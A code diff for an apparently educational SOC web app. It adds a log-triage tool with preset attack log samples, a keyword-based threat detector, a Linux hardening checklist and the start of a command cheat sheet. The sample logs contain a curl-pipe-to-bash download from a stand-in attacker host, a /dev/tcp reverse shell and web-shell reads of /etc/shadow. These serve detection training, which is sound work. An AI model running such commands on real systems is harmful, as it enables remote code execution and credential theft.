-Aug 01 14:22:05 kali sshd[4512]: Failed password for invalid user admin from 192.168.1.105 port 54128 ssh2
-Aug 01 14:22:09 kali sshd[4512]: Accepted password for root from 192.168.1.105 port 54132 ssh2
-Aug 01 14:22:10 kali systemd-logind[900]: New session 42 of user root.`,
+  bruteforce: `Aug 03 14:22:01 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54122 ssh2
+Aug 03 14:22:03 kali sshd[4512]: Failed password for root from 192.168.1.105 port 54124 ssh2
+Aug 03 14:22:05 kali sshd[4512]: Failed password for invalid user admin from 192.168.1.105 port 54128 ssh2
+Aug 03 14:22:07 kali sshd[4512]: Failed password for invalid user deploy from 192.168.1.105 port 54130 ssh2
+Aug 03 14:22:09 kali sshd[4512]: Accepted password for root from 192.168.1.105 port 54132 ssh2
+Aug 03 14:22:10 kali systemd-logind[900]: New session 42 of user root.`,
 
-  privesc: `Aug 01 15:10:12 kali sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \\;
-Aug 01 15:10:14 kali kernel: [ 4512.981] pkexec[9812]: SUID binary executed by uid 1000
-Aug 01 15:10:15 kali shadow: Password hash changed for user root via passwd`,
+  privesc: `Aug 03 15:10:12 kali sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \\;
+Aug 03 15:10:14 kali kernel: [ 4512.981] pkexec[9812]: SUID binary executed by uid 1000
+Aug 03 15:10:15 kali shadow: Password hash changed for user root via passwd`,
 
-  webshell: `Aug 01 16:05:00 kali apache2[1200]: 10.0.0.45 - - [01/Aug/2026:16:05:00] "GET /uploads/shell.php?cmd=cat%20/etc/shadow HTTP/1.1" 200 1420
-Aug 01 16:05:05 kali apache2[1200]: 10.0.0.45 - - [01/Aug/2026:16:05:05] "POST /uploads/shell.php HTTP/1.1" 200 4500
-Aug 01 16:05:10 kali kernel: [ 5200.12] nc[14512]: Outbound TCP connection to 10.0.0.45:4444 established`
+  webshell: `Aug 03 16:05:00 kali apache2[1200]: 10.0.0.45 - - [03/Aug/2026:16:05:00] "GET /uploads/shell.php?cmd=cat%20/etc/shadow HTTP/1.1" 200 1420
+Aug 03 16:05:05 kali apache2[1200]: 10.0.0.45 - - [03/Aug/2026:16:05:05] "POST /uploads/shell.php HTTP/1.1" 200 4500
+Aug 03 16:05:10 kali kernel: [ 5200.12] nc[14512]: Outbound TCP connection to 10.0.0.45:4444 established`,
+
+  cron_persistence: `Aug 03 17:00:01 soc-server CRON[8812]: (root) CMD (curl -s http://attacker-c2.com/malware.sh | bash)
+Aug 03 17:01:00 soc-server systemd[1]: Started Persistence Reverse Shell Service.`,
+
+  shadow_dump: `Aug 03 18:15:20 soc-node auditd[512]: SYSCALL=openat path="/etc/shadow" flags=O_RDONLY exe="/usr/bin/python3" uid=1000
+Aug 03 18:15:22 soc-node python3[9102]: Outbound HTTPS connection to 185.220.101.5:443 established`,
+
+  reverse_shell: `Aug 03 19:30:11 soc-endpoint bash[1042]: bash -i >& /dev/tcp/10.10.14.20/4444 0>&1
+Aug 03 19:30:12 soc-endpoint ss[1050]: ESTAB 0 0 192.168.1.50:52140 -> 10.10.14.20:4444 users:(("bash",pid=1042,fd=3))`,
+
+  ransomware_staging: `Aug 03 20:00:00 prod-db tar[14102]: Creating archive /tmp/staged_data.tar.gz containing /var/www/html/db_backup.sql
+Aug 03 20:01:15 prod-db gpg[14200]: Encrypted /tmp/staged_data.tar.gz with key ID 0x98A1B2C3`,
+
+  kernel_rootkit: `Aug 03 21:10:05 kernel: [ 8901.12] insmod: Loading kernel module 'reptile_rk.ko' (unsigned module)
+Aug 03 21:10:06 kernel: [ 8902.45] sys_call_table hooked at 0xffffffff81001020 by reptile_rk`,
+
+  apache_scanner: `Aug 03 22:00:01 web-server apache2[900]: 198.51.100.4 - - "GET /etc/passwd HTTP/1.1" 403 280
+Aug 03 22:00:02 web-server apache2[900]: 198.51.100.4 - - "GET /cgi-bin/test-cgi HTTP/1.1" 404 200
+Aug 03 22:00:03 web-server apache2[900]: 198.51.100.4 - - "POST /wp-login.php HTTP/1.1" 200 450`,
+
+  sudo_abuse: `Aug 03 23:15:00 db01 sudo: dbadmin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/vim /etc/sudoers
+Aug 03 23:15:10 db01 sudo: dbadmin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash`
 };
 
 function generateLogParserHTML() {
   return `
     <article class="logparser-wrapper">
       <div style="text-align:center; margin-bottom:1.5rem;">
-        <h2 style="color:var(--accent-blue); font-size:1.6rem; margin-bottom:0.4rem;">🔍 SIEM Log Parser & Threat Detection Lab</h2>
+        <h2 style="color:var(--accent-blue); font-size:1.6rem; margin-bottom:0.4rem; font-family:'Outfit',sans-serif;">🔍 SIEM Log Threat Detection & Parser Engine</h2>
         <p style="color:var(--text-dark); font-size:0.9rem;">
-          Paste raw Linux logs below or select a preset incident sample to run automated threat triage!
+          Select a preset real-world incident log stream below or paste custom Linux logs to trigger automated threat triage!
         </p>
       </div>
 
-      <div class="log-preset-bar">
-        <span style="font-weight:700; font-size:0.85rem; align-self:center; color:var(--text-ink);">Load Preset:</span>
+      <div class="log-preset-bar" style="display:flex; flex-wrap:wrap; gap:0.4rem; justify-content:center; margin-bottom:1.2rem;">
         <button class="btn-preset" onclick="loadSampleLog('bruteforce')">🚨 SSH Brute Force</button>
-        <button class="btn-preset" onclick="loadSampleLog('privesc')">🔓 SUID PrivEsc</button>
+        <button class="btn-preset" onclick="loadSampleLog('privesc')">🔓 SUID / Sudo PrivEsc</button>
         <button class="btn-preset" onclick="loadSampleLog('webshell')">🐍 Web Shell & Reverse Shell</button>
+        <button class="btn-preset" onclick="loadSampleLog('cron_persistence')">📌 Cron Persistence</button>
+        <button class="btn-preset" onclick="loadSampleLog('shadow_dump')">🔑 /etc/shadow Dump</button>
+        <button class="btn-preset" onclick="loadSampleLog('reverse_shell')">📡 Reverse TCP Shell</button>
+        <button class="btn-preset" onclick="loadSampleLog('ransomware_staging')">💥 Data Staging</button>
+        <button class="btn-preset" onclick="loadSampleLog('kernel_rootkit')">👾 Rootkit Injection</button>
+        <button class="btn-preset" onclick="loadSampleLog('apache_scanner')">🌐 Web Vulnerability Scan</button>
+        <button class="btn-preset" onclick="loadSampleLog('sudo_abuse')">🛡️ Sudoers File Abuse</button>
       </div>
 
-      <textarea id="log-input-area" class="log-textarea" placeholder="Paste /var/log/auth.log or syslog here..."></textarea>
+      <textarea id="log-input-area" class="log-textarea" style="width:100%; min-height:160px; font-family:'Fira Code',monospace; font-size:0.85rem; padding:0.9rem; border-radius:10px; border:1.5px solid var(--card-border); background:#0f172a; color:#f8fafc;" placeholder="Paste raw Linux log lines (/var/log/auth.log, syslog, apache access.log)..."></textarea>
       
-      <div style="text-align:center; margin-top:0.5rem;">
-        <button class="btn-action btn-cyber" onclick="runLogTriage()" style="padding:0.6rem 1.8rem; font-size:1rem;">
-          <span class="icon">🔍</span><span> Run Threat Detection Engine</span>
+      <div style="text-align:center; margin-top:0.8rem;">
+        <button class="btn-action btn-cyber" onclick="runLogTriage()" style="padding:0.75rem 2rem; font-size:1.05rem; font-weight:800; background:var(--accent-blue); color:#ffffff; border:none; border-radius:10px; cursor:pointer;">
+          🔍 Run Automated Threat Detection Engine
         </button>
       </div>
 
@@ -1598,6 +1964,7 @@ function loadSampleLog(preset) {
   const area = document.getElementById("log-input-area");
   if (area && SAMPLE_LOGS[preset]) {
     area.value = SAMPLE_LOGS[preset];
+    runLogTriage();
   }
 }
 
@@ -1615,58 +1982,94 @@ function runLogTriage() {
     let isHigh = false;
     let isMed = false;
 
-    if (lower.includes("failed password") || lower.includes("shell.php") || lower.includes("sudo:") || lower.includes("suid") || lower.includes("accepted password for root")) {
+    if (lower.includes("failed password") || lower.includes("shell.php") || lower.includes("sudo:") || lower.includes("suid") || lower.includes("accepted password for root") || lower.includes("insmod") || lower.includes("/etc/shadow") || lower.includes("dev/tcp") || lower.includes("gpg") || lower.includes("cron")) {
       isHigh = true;
       threatCount++;
-      if (lower.includes("failed password") && !detectedThreats.includes("SSH Brute Force Attempt")) detectedThreats.push("SSH Brute Force Attempt (T1110)");
-      if (lower.includes("shell.php") && !detectedThreats.includes("Web Shell Command Execution")) detectedThreats.push("Web Shell Execution (T1505.003)");
-      if (lower.includes("sudo:") && !detectedThreats.includes("Sudo Escalation Abuse")) detectedThreats.push("Sudo PrivEsc Abuse (T1548.002)");
-      if (lower.includes("suid") && !detectedThreats.includes("SUID Binary Execution")) detectedThreats.push("SUID Binary Abuse (T1548.001)");
-    } else if (lower.includes("invalid user") || lower.includes("connection established") || lower.includes("session")) {
+      if (lower.includes("failed password") && !detectedThreats.includes("SSH Brute Force Attempt (T1110)")) detectedThreats.push("SSH Brute Force Attempt (T1110)");
+      if (lower.includes("shell.php") && !detectedThreats.includes("Web Shell Command Execution (T1505.003)")) detectedThreats.push("Web Shell Command Execution (T1505.003)");
+      if (lower.includes("sudo:") && !detectedThreats.includes("Sudo PrivEsc Abuse (T1548.002)")) detectedThreats.push("Sudo PrivEsc Abuse (T1548.002)");
+      if (lower.includes("suid") && !detectedThreats.includes("SUID Binary Abuse (T1548.001)")) detectedThreats.push("SUID Binary Abuse (T1548.001)");
+      if (lower.includes("insmod") && !detectedThreats.includes("Kernel Rootkit Load (T1014)")) detectedThreats.push("Kernel Rootkit Load (T1014)");
+      if (lower.includes("/etc/shadow") && !detectedThreats.includes("Shadow Credential Reading (T1003.008)")) detectedThreats.push("Shadow Credential Reading (T1003.008)");
+      if (lower.includes("dev/tcp") && !detectedThreats.includes("Reverse Shell Beaconing (T1095)")) detectedThreats.push("Reverse Shell Beaconing (T1095)");
+    } else if (lower.includes("invalid user") || lower.includes("connection established") || lower.includes("session") || lower.includes("403") || lower.includes("404")) {
       isMed = true;
       threatCount++;
     }
 
     const cssClass = isHigh ? 'log-line threat-high' : isMed ? 'log-line threat-medium' : 'log-line';
-    return `<div class="${cssClass}">${escapeHTML(line)}</div>`;
+    const highlightStyle = isHigh ? 'background:rgba(239,68,68,0.2); color:#f87171; font-weight:800;' : isMed ? 'background:rgba(234,179,8,0.15); color:#facc15;' : '';
+    return `<div class="${cssClass}" style="padding:0.3rem 0.6rem; margin:0.15rem 0; border-radius:4px; font-family:'Fira Code',monospace; font-size:0.84rem; ${highlightStyle}">${escapeHTML(line)}</div>`;
   }).join('');
 
   resultsDiv.style.display = "block";
   resultsDiv.innerHTML = `
     <div style="background:var(--paper-bg); border:2px solid var(--card-border); border-radius:12px; padding:1.2rem; margin-bottom:1rem;">
-      <h3 style="color:${threatCount > 0 ? 'var(--accent-red)' : 'var(--accent-green)'}; font-size:1.2rem; margin-bottom:0.5rem;">
-        ${threatCount > 0 ? `🚨 Threat Detection Result: ${threatCount} Anomalies Detected!` : `✅ Log Stream Clean — No Immediate High Severity Threats`}
+      <h3 style="color:${threatCount > 0 ? 'var(--accent-red)' : 'var(--accent-green)'}; font-size:1.2rem; margin-bottom:0.5rem; font-family:'Outfit',sans-serif;">
+        ${threatCount > 0 ? `🚨 Threat Detection Result: ${threatCount} Anomalous Line(s) Detected!` : `✅ Log Stream Clean — No Immediate High Severity Threats`}
       </h3>
       ${detectedThreats.length > 0 ? `
         <div style="margin-bottom:0.8rem;">
-          <strong style="color:var(--text-ink);">Mapped MITRE TTPs:</strong>
-          <div style="display:flex; gap:0.4rem; margin-top:0.3rem; flex-wrap:wrap;">
-            ${detectedThreats.map(t => `<span class="cover-badge" style="background:#fee2e2; color:#991b1b; border:1px solid #f87171;">${t}</span>`).join('')}
+          <strong style="color:var(--text-ink);">Mapped MITRE ATT&CK TTPs:</strong>
+          <div style="display:flex; gap:0.4rem; margin-top:0.4rem; flex-wrap:wrap;">
+            ${detectedThreats.map(t => `<span class="cover-badge" style="background:#fee2e2; color:#991b1b; border:1px solid #f87171; padding:0.25rem 0.65rem; border-radius:12px; font-weight:800; font-size:0.78rem;">${t}</span>`).join('')}
           </div>
         </div>
       ` : ''}
-      <div style="font-family:var(--font-hand); font-size:1.1rem; color:var(--text-ink); background:var(--bg-app); padding:0.8rem; border-radius:8px;">
-        💡 <strong>Telugu-English Triage Tip:</strong> Ee log file lo high severity lines red lo highlight chesam. SOC Analyst triage lo first SSH Failed count check cheyali, user account compromise nunchi IP block ('fail2ban') & SUID binaries revoke cheyali!
+      <div style="font-family:var(--font-hand); font-size:1.05rem; color:var(--text-ink); background:var(--bg-app); padding:0.9rem; border-radius:10px; border:1px solid var(--card-border); margin-top:0.6rem;">
+        💡 <strong>Telugu-English SOC Analyst Triage Note:</strong> Ee log stream lo red high-severity threat lines highlight chesam. Immediate SOC containment steps: 1) Block attacker source IP via UFW / IPTables, 2) Revoke compromised user sessions using \`pkill -u <user>\`, 3) Audit \`/var/log/auth.log\` & \`/etc/shadow\` for persistent backdoors!
       </div>
     </div>
 
-    <div class="log-output-box">
+    <div class="log-output-box" style="background:#0f172a; padding:1rem; border-radius:10px; overflow-x:auto;">
       ${processedLines}
     </div>
   `;
 }
 
-
-// --- 2. CIS-STYLE HARDENING CHECKLIST ---
+// --- 30-RULE CIS BENCHMARK LINUX HARDENING AUDIT CHECKLIST ---
 const HARDENING_ITEMS = [
+  // User & Access Security
   { id: "h1", cat: "User & Access Security", text: "Disable Root SSH Direct Login in /etc/ssh/sshd_config (PermitRootLogin no)", cmd: "sudo sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config" },
   { id: "h2", cat: "User & Access Security", text: "Enforce SSH Protocol 2 and Disable Empty Passwords", cmd: "sudo sed -i 's/#PermitEmptyPasswords.*/PermitEmptyPasswords no/' /etc/ssh/sshd_config" },
   { id: "h3", cat: "User & Access Security", text: "Set Strict Permissions on /etc/shadow (chmod 600 & chown root:root)", cmd: "sudo chmod 600 /etc/shadow && sudo chown root:root /etc/shadow" },
-  { id: "h4", cat: "Network & Firewall", text: "Enable UFW Firewall with Default Deny Incoming Rules", cmd: "sudo ufw default deny incoming && sudo ufw default allow outgoing && sudo ufw enable" },
-  { id: "h5", cat: "Network & Firewall", text: "Disable IP Forwarding in sysctl.conf (net.ipv4.ip_forward = 0)", cmd: "sudo sysctl -w net.ipv4.ip_forward=0" },
-  { id: "h6", cat: "File System Security", text: "Audit All SUID/SGID Binaries for GTFOBins Privilege Escalation Vectors", cmd: "find / -type f \\( -perm -4000 -o -perm -2000 \\) -ls 2>/dev/null" },
-  { id: "h7", cat: "File System Security", text: "Mount /tmp directory with noexec, nosuid, nodev flags in /etc/fstab", cmd: "sudo mount -o remount,noexec,nosuid,nodev /tmp" },
-  { id: "h8", cat: "Logging & Auditd", text: "Enable Auditd Rules for Monitoring /etc/passwd and /etc/shadow Changes", cmd: "sudo auditctl -w /etc/shadow -p wa -k shadow_changes" }
+  { id: "h4", cat: "User & Access Security", text: "Set Strict Permissions on /etc/passwd (chmod 644 & chown root:root)", cmd: "sudo chmod 644 /etc/passwd && sudo chown root:root /etc/passwd" },
+  { id: "h5", cat: "User & Access Security", text: "Lock Dormant System Accounts (passwd -l <user>)", cmd: "sudo passwd -l www-data" },
+  
+  // Network & Firewall
+  { id: "h6", cat: "Network & Firewall", text: "Enable UFW Firewall with Default Deny Incoming Rules", cmd: "sudo ufw default deny incoming && sudo ufw default allow outgoing && sudo ufw enable" },
+  { id: "h7", cat: "Network & Firewall", text: "Disable IPv4 Routing / IP Forwarding in sysctl.conf", cmd: "sudo sysctl -w net.ipv4.ip_forward=0" },
+  { id: "h8", cat: "Network & Firewall", text: "Disable ICMP Echo Broadcast Requests (Ignore Ping Sweep Scans)", cmd: "sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1" },
+  { id: "h9", cat: "Network & Firewall", text: "Enable TCP SYN Cookies to Protect Against SYN Flood DoS Attacks", cmd: "sudo sysctl -w net.ipv4.tcp_syncookies=1" },
+  { id: "h10", cat: "Network & Firewall", text: "Disable Source Routed Packet Acceptance (net.ipv4.conf.all.accept_source_route=0)", cmd: "sudo sysctl -w net.ipv4.conf.all.accept_source_route=0" },
+
+  // File System Security
+  { id: "h11", cat: "File System Security", text: "Audit All SUID/SGID Binaries for GTFOBins Privilege Escalation Vectors", cmd: "find / -type f \\( -perm -4000 -o -perm -2000 \\) -ls 2>/dev/null" },
+  { id: "h12", cat: "File System Security", text: "Mount /tmp Directory with noexec, nosuid, nodev Flags in /etc/fstab", cmd: "sudo mount -o remount,noexec,nosuid,nodev /tmp" },
+  { id: "h13", cat: "File System Security", text: "Mount /var/tmp with noexec Partition Restrictions", cmd: "sudo mount -o remount,noexec,nosuid,nodev /var/tmp" },
+  { id: "h14", cat: "File System Security", text: "Audit World-Writable Directories and Remove Sticky Bits Fixes", cmd: "find / -type d \\( -perm -0002 -a ! -perm -1000 \\) -ls 2>/dev/null" },
+  { id: "h15", cat: "File System Security", text: "Set Default Umask to 027 in /etc/profile & /etc/bash.bashrc", cmd: "echo 'umask 027' | sudo tee -a /etc/profile" },
+
+  // Logging & Auditd
+  { id: "h16", cat: "Logging & Auditd", text: "Enable Auditd Rules for Monitoring /etc/passwd and /etc/shadow Changes", cmd: "sudo auditctl -w /etc/shadow -p wa -k shadow_changes" },
+  { id: "h17", cat: "Logging & Auditd", text: "Enable Auditd Monitoring for System Execution (execve syscalls)", cmd: "sudo auditctl -a always,exit -F arch=b64 -S execve -k system_exec" },
+  { id: "h18", cat: "Logging & Auditd", text: "Configure Remote Syslog Forwarding to Central SIEM Collector", cmd: "echo '*.* @siem.company.internal:514' | sudo tee -a /etc/rsyslog.conf" },
+  { id: "h19", cat: "Logging & Auditd", text: "Enforce Logrotate Compression for /var/log/ Auth & Syslog Logs", cmd: "sudo logrotate -f /etc/logrotate.conf" },
+  { id: "h20", cat: "Logging & Auditd", text: "Restrict Permissions on /var/log File Artifacts (chmod 640)", cmd: "sudo chmod -R 640 /var/log/auth.log" },
+
+  // Service Hardening
+  { id: "h21", cat: "Service Hardening", text: "Disable Unnecessary Legacy Services (telnet, rsh, rlogin)", cmd: "sudo systemctl disable --now inetd rsh.socket rlogin.socket" },
+  { id: "h22", cat: "Service Hardening", text: "Disable Unused Network Protocols (DCCP, SCTP, RDS, TIPC)", cmd: "echo 'install dccp /bin/true' | sudo tee /etc/modprobe.d/dccp.conf" },
+  { id: "h23", cat: "Service Hardening", text: "Configure Fail2ban for Automatic SSH Brute Force IP Blocking", cmd: "sudo apt-get install fail2ban -y && sudo systemctl enable --now fail2ban" },
+  { id: "h24", cat: "Service Hardening", text: "Disable Apache / Nginx Server Tokens & Banners Disclosure", cmd: "echo 'ServerTokens Prod' | sudo tee -a /etc/apache2/conf-available/security.conf" },
+  { id: "h25", cat: "Service Hardening", text: "Restrict Cron Access to Authorized Users Only (/etc/cron.allow)", cmd: "echo 'root' | sudo tee /etc/cron.allow && sudo chmod 600 /etc/cron.allow" },
+
+  // Kernel & Memory Security
+  { id: "h26", cat: "Kernel & Memory Security", text: "Enable Address Space Layout Randomization (ASLR = 2)", cmd: "sudo sysctl -w kernel.randomize_va_space=2" },
+  { id: "h27", cat: "Kernel & Memory Security", text: "Restrict dmesg Access to Root User Only (kernel.dmesg_restrict = 1)", cmd: "sudo sysctl -w kernel.dmesg_restrict=1" },
+  { id: "h28", cat: "Kernel & Memory Security", text: "Restrict Kernel Pointer Addresses in /proc/kallsyms (kptr_restrict = 2)", cmd: "sudo sysctl -w kernel.kptr_restrict=2" },
+  { id: "h29", cat: "Kernel & Memory Security", text: "Disable Unprivileged eBPF Execution (kernel.unprivileged_bpf_disabled = 1)", cmd: "sudo sysctl -w kernel.unprivileged_bpf_disabled=1" },
+  { id: "h30", cat: "Kernel & Memory Security", text: "Enable Ptrace Scope Restrictions (kernel.yama.ptrace_scope = 1)", cmd: "sudo sysctl -w kernel.yama.ptrace_scope=1" }
 ];
 
 function generateHardeningHTML() {
@@ -1676,27 +2079,27 @@ function generateHardeningHTML() {
 
   return `
     <article class="hardening-wrapper">
-      <div class="score-card">
-        <h2 style="font-size:1.5rem; margin-bottom:0.3rem;">🛡️ CIS Linux Security Hardening Score</h2>
-        <div style="font-size:2.4rem; font-weight:800; margin:0.4rem 0;"><span id="hardening-score-text">${pct}</span>%</div>
-        <p style="font-size:0.9rem; opacity:0.9;">Completed <span id="hardening-count">${checkedCount}</span> of ${HARDENING_ITEMS.length} Audit Control Rules</p>
-        <div class="score-bar-bg">
-          <div id="hardening-score-fill" class="score-bar-fill" style="width:${pct}%;"></div>
+      <div class="score-card" style="background:linear-gradient(135deg, #0284c7, #0369a1); color:#ffffff; padding:1.5rem; border-radius:16px; text-align:center; box-shadow:0 8px 24px rgba(2,132,199,0.3); margin-bottom:1.5rem;">
+        <h2 style="font-size:1.6rem; margin-bottom:0.3rem; font-family:'Outfit',sans-serif;">🛡️ CIS Linux Benchmark Hardening Score</h2>
+        <div style="font-size:2.8rem; font-weight:800; margin:0.4rem 0;"><span id="hardening-score-text">${pct}</span>%</div>
+        <p style="font-size:0.92rem; opacity:0.95;">Completed <span id="hardening-count">${checkedCount}</span> of ${HARDENING_ITEMS.length} Enterprise Audit Control Rules</p>
+        <div class="score-bar-bg" style="background:rgba(255,255,255,0.2); height:12px; border-radius:20px; overflow:hidden; margin-top:0.8rem;">
+          <div id="hardening-score-fill" class="score-bar-fill" style="width:${pct}%; height:100%; background:#4ade80; border-radius:20px; transition:width 0.3s ease;"></div>
         </div>
       </div>
 
-      <div class="checklist-group">
+      <div class="checklist-group" style="display:flex; flex-direction:column; gap:0.9rem;">
         ${HARDENING_ITEMS.map(item => {
           const isChecked = savedChecks.includes(item.id);
           return `
-            <div class="checklist-item" onclick="toggleHardeningCheck('${item.id}')">
-              <input type="checkbox" id="chk-${item.id}" ${isChecked ? 'checked' : ''} onclick="event.stopPropagation(); toggleHardeningCheck('${item.id}')" />
+            <div class="checklist-item" style="background:var(--paper-bg); border:1.5px solid var(--card-border); border-radius:12px; padding:1rem; display:flex; gap:1rem; align-items:flex-start; cursor:pointer;" onclick="toggleHardeningCheck('${item.id}')">
+              <input type="checkbox" id="chk-${item.id}" ${isChecked ? 'checked' : ''} onclick="event.stopPropagation(); toggleHardeningCheck('${item.id}')" style="width:1.3rem; height:1.3rem; margin-top:0.2rem; cursor:pointer;" />
               <div style="flex:1;">
-                <div style="font-size:0.75rem; font-weight:700; color:var(--accent-blue); text-transform:uppercase;">${item.cat}</div>
-                <div style="font-weight:700; font-size:0.92rem; color:var(--text-dark); margin:0.2rem 0;">${item.text}</div>
-                <div style="font-family:var(--font-mono); font-size:0.76rem; color:#64748b; background:var(--paper-bg); padding:0.3rem 0.6rem; border-radius:6px; border:1px solid var(--card-border); margin-top:0.3rem; display:flex; justify-content:space-between; align-items:center;">
-                  <code>${escapeHTML(item.cmd)}</code>
-                  <button class="btn-copy-cmd" onclick="event.stopPropagation(); copyCmdToClipboard('${escapeHTML(item.cmd)}')">📋 Copy</button>
+                <div style="font-size:0.75rem; font-weight:800; color:var(--accent-blue); text-transform:uppercase;">${item.cat}</div>
+                <div style="font-weight:800; font-size:0.95rem; color:var(--text-ink); margin:0.2rem 0;">${item.text}</div>
+                <div style="font-family:'Fira Code',monospace; font-size:0.8rem; color:#64748b; background:var(--bg-app); padding:0.4rem 0.8rem; border-radius:8px; border:1px solid var(--card-border); margin-top:0.4rem; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.4rem;">
+                  <code style="color:var(--accent-red); font-weight:700;">${escapeHTML(item.cmd)}</code>
+                  <button class="btn-copy-cmd" style="background:var(--accent-blue); color:#ffffff; border:none; padding:0.2rem 0.6rem; border-radius:6px; font-weight:700; cursor:pointer; font-size:0.75rem;" onclick="event.stopPropagation(); copyCmdToClipboardRaw('${escapeHTML(item.cmd)}', this)">📋 Copy Command</button>
                 </div>
               </div>
             </div>
@@ -1727,111 +2130,712 @@ function toggleHardeningCheck(id) {
 }
 
 
-// --- 3. 1-CLICK CHEAT SHEET GENERATOR ---
-const CHEAT_SHEET_COMMANDS = [
-  { cat: "File Forensics", cmd: "grep -rnw '/var/log/' -e 'FAILED'", desc: "Search recursively for FAILED events in all logs." },
-  { cat: "File Forensics", cmd: "find / -mtime -1 -type f 2>/dev/null", desc: "Find all files modified in the last 24 hours." },
-  { cat: "Process Triage", cmd: "ps aux --sort=-%cpu | head -n 10", desc: "List top 10 highest CPU-consuming processes." },
-  { cat: "Process Triage", cmd: "ls -la /proc/<PID>/exe", desc: "Find true execution path of suspicious process PID." },
-  { cat: "Network Triage", cmd: "ss -tulpn | grep LISTEN", desc: "List all active listening TCP/UDP ports & PIDs." },
-  { cat: "Network Triage", cmd: "lsof -i :4444", desc: "Identify process connected to specific port 4444." },
-  { cat: "Permission Audit", cmd: "find / -perm -4000 -type f 2>/dev/null", desc: "Scan for all SUID binaries on Linux system." },
-  { cat: "Log Analysis", cmd: "awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -nr", desc: "Count and rank top remote IP addresses in logs." }
-];
+// --- 3. MASTER CHEAT SHEET LOGIC ---
+let activeCheatFilter = "All";
+let activeCheatSubTab = "commands";
+let bookmarkedCheatSheetIds = JSON.parse(localStorage.getItem("soc_bookmarked_cheatsheets") || "[]");
 
 function generateCheatSheetHTML() {
+  const dataset = window.MASTER_CHEATSHEET_DATA || { categories: [], recipes: [], scenarios: [], chains: [], top25: [], commands: [] };
+  const commands = dataset.commands || [];
+  const recipes = dataset.recipes || [];
+  const scenarios = dataset.scenarios || [];
+  const chains = dataset.chains || [];
+  const top25 = dataset.top25 || [];
+
+  const totalCmds = commands.length;
+  const essentialCount = commands.filter(c => c.relevance === "Essential").length;
+  const catCount = dataset.categories ? dataset.categories.length : 25;
+  const bookmarkedCount = bookmarkedCheatSheetIds.length;
+
+  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
+
   return `
-    <article class="hardening-wrapper">
-      <div style="text-align:center; margin-bottom:1.5rem;">
-        <h2 style="color:var(--accent-blue); font-size:1.6rem; margin-bottom:0.4rem;">📑 1-Click Interactive Linux SOC Command Cheat Sheet</h2>
-        <p style="color:var(--text-dark); font-size:0.9rem;">
-          Essential Linux commands for Blue Teaming, Forensic Triage, & Log Analysis. Click 📋 Copy to use instantly!
+    <article class="hardening-wrapper cs-master-container">
+      <!-- HEADER BANNER -->
+      <div style="text-align:center; margin-bottom:0.6rem;">
+        <h2 style="color:var(--accent-blue); font-size:1.75rem; margin-bottom:0.3rem; font-family:'Outfit',sans-serif; font-weight:800;">
+          🚀 Linux SOC Analyst A–Z Master Command Field Handbook
+        </h2>
+        <p style="color:var(--text-dark); font-size:0.9rem; max-width:820px; margin:0 auto;">
+          Blue Team Field Notebook: Detection → Triage → Investigation → Evidence Collection → Threat Hunting → Containment.
         </p>
       </div>
 
-      <div class="cheatsheet-grid">
-        ${CHEAT_SHEET_COMMANDS.map(c => `
-          <div class="cmd-card">
-            <button class="btn-copy-cmd" onclick="copyCmdToClipboard('${escapeHTML(c.cmd)}')">📋 Copy</button>
-            <div style="font-size:0.75rem; font-weight:700; color:var(--accent-blue); text-transform:uppercase; margin-bottom:0.3rem;">${c.cat}</div>
-            <div style="font-family:var(--font-mono); font-weight:700; font-size:0.85rem; color:var(--accent-red); margin-bottom:0.4rem; padding-right:3rem;">
-              ${escapeHTML(c.cmd)}
-            </div>
-            <div style="font-size:0.8rem; color:#64748b;">${c.desc}</div>
+      <!-- STATS DASHBOARD -->
+      <div class="cs-stats-row">
+        <div class="cs-stat-card">
+          <span class="cs-stat-icon">💻</span>
+          <div>
+            <div class="cs-stat-val" id="cs-stat-total">${totalCmds}</div>
+            <div class="cs-stat-lbl">Master Commands</div>
           </div>
-        `).join('')}
+        </div>
+        <div class="cs-stat-card">
+          <span class="cs-stat-icon">⭐</span>
+          <div>
+            <div class="cs-stat-val">${essentialCount}</div>
+            <div class="cs-stat-lbl">SOC Essentials</div>
+          </div>
+        </div>
+        <div class="cs-stat-card">
+          <span class="cs-stat-icon">📚</span>
+          <div>
+            <div class="cs-stat-val">${catCount}</div>
+            <div class="cs-stat-lbl">SOC Categories</div>
+          </div>
+        </div>
+        <div class="cs-stat-card">
+          <span class="cs-stat-icon">🔖</span>
+          <div>
+            <div class="cs-stat-val" id="cs-stat-saved">${bookmarkedCount}</div>
+            <div class="cs-stat-lbl">Bookmarked</div>
+          </div>
+        </div>
+        <div class="cs-stat-card">
+          <span class="cs-stat-icon">🧪</span>
+          <div>
+            <div class="cs-stat-val">${recipes.length}</div>
+            <div class="cs-stat-lbl">Triage Recipes</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- NAVIGATION SUB-TAB SWITCHER -->
+      <div class="cs-tab-switcher">
+        <button class="cs-tab-btn ${activeCheatSubTab === 'commands' ? 'active' : ''}" onclick="switchCheatSubTab('commands', this)">📚 All Commands &amp; Library</button>
+        <button class="cs-tab-btn ${activeCheatSubTab === 'top25' ? 'active' : ''}" onclick="switchCheatSubTab('top25', this)">🚨 Top 25 Essentials</button>
+        <button class="cs-tab-btn ${activeCheatSubTab === 'recipes' ? 'active' : ''}" onclick="switchCheatSubTab('recipes', this)">🧪 Triage Recipes (${recipes.length})</button>
+        <button class="cs-tab-btn ${activeCheatSubTab === 'scenarios' ? 'active' : ''}" onclick="switchCheatSubTab('scenarios', this)">🎯 Real SOC Scenarios (${scenarios.length})</button>
+        <button class="cs-tab-btn ${activeCheatSubTab === 'chains' ? 'active' : ''}" onclick="switchCheatSubTab('chains', this)">🔗 Evidence Chains (${chains.length})</button>
+      </div>
+
+      <!-- SECTION 1: ALL COMMANDS LIBRARY (DEFAULT) -->
